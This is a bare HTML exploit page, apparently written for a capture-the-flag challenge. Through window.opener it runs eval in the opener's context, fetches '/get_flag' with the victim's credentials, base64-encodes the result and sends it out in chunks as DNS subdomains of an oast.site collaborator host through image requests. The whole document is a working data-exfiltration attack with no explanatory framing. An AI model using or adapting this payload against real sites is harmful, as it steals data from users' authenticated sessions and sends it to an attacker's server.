<!DOCTYPE html>
<html>
<body>
<script>
if (window.opener) {
  window.opener.eval(`
    fetch('/get_flag', { credentials: 'include' })
      .then(r => r.text())
      .then(flag => {
        window.name = btoa(flag);
      });
  `);

  setTimeout(() => {
    let flag = window.name;
    let chunks = flag.match(/.{1,20}/g);
    for (let i = 0; i < chunks.length; i++) {
      let sub = chunks[i] + '.' + i + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
      new Image().src = 'http://' + sub + '/';
    }
  }, 1500);
}
</script>
</body>
</html>
